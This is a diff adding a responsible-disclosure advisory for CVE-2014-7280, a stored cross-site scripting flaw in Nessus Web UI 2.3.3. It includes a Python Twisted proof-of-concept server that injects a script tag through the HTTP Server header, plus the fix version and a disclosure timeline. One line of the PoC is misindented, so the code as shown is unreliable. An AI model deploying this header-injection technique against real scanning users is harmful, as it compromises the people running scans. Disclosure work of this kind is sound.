@@ -1,0 +1,69 @@
+Nessus Web UI 2.3.3: Stored XSS
+=========================================================
+
+CVE number: CVE-2014-7280
+Permalink: http://www.thesecurityfactory.be/permalink/nessus-stored-xss.html
+Vendor advisory: http://www.tenable.com/security/tns-2014-08
+
+-- Info --
+
+Nessus is a proprietary comprehensive vulnerability scanner which is developed by Tenable Network Security. Tenable Network Security estimates that it is used by over 75,000 organisations worldwide.
+
+-- Affected version -
+
+Web UI version 2.3.3, Build #83
+
+-- Vulnerability details --
+
+By setting up a malicious web server that returns a specially crafted host header, an attacker is able to execute javascript code on the machine of the person performing a vulnerability scan of the web server. No escaping on javascript code is being performed when passing the server header to the affected Web UI version via a plugin.
+The javascript code will be stored in the backend database, and will execute every time the target views a report that returns the server header.
+
+-- POC --
+
+#!/usr/bin/env python
+import sys
+from twisted.web import server, resource
+from twisted.internet import reactor
+from twisted.python import log
+
+class Site(server.Site):
+    def getResourceFor(self, request):
+        request.setHeader('server', '<script>alert(1)</script>SomeServer')
+        return server.Site.getResourceFor(self, request)
+
+class HelloResource(resource.Resource):
+    isLeaf = True
+    numberRequests = 0
+
+    def render_GET(self, request):
+        self.numberRequests += 1
+        request.setHeader("content-type", "text/plain")
+return "theSecurityFactory Nessus POC"
+
+log.startLogging(sys.stderr)
+reactor.listenTCP(8080, Site(HelloResource()))
+reactor.run()
+
+-- Solution --
+
+This issue has been fixed as of version 2.3.4 of the WEB UI.
+
+
+-- Timeline --
+
+2014-06-12   Release of Web UI version 2.3.3, build#83
+
+2014-06-13        Vulnerability discovered and creation of POC
+
+2014-06-13        Vulnerability responsibly reported to vendor
+
+2014-06-13        Vulnerability acknowledged by vendor
+
+2014-06-13        Release of Web UI version 2.3.4, build#85
+
+2014-XX-XX        Advisory published in coordination with vendor
+
+-- Credit --
+
+Frank Lycops
+Frank.lycops [at] thesecurityfactory.be
